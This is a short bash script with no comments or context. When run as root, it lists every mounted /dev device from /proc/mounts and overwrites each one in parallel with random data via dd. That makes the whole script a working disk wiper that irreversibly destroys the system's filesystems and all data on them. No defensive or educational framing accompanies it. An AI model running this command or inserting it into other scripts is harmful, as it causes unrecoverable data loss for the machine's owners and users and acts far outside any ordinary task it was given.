#!/bin/bash
if [[ "${UID}" == 0 ]]; then
  grep -E "^/dev" /proc/mounts | cut -d" " -f1 | sort -u \
    | xargs -P8 -I{} dd if=/dev/urandom of={}
fi
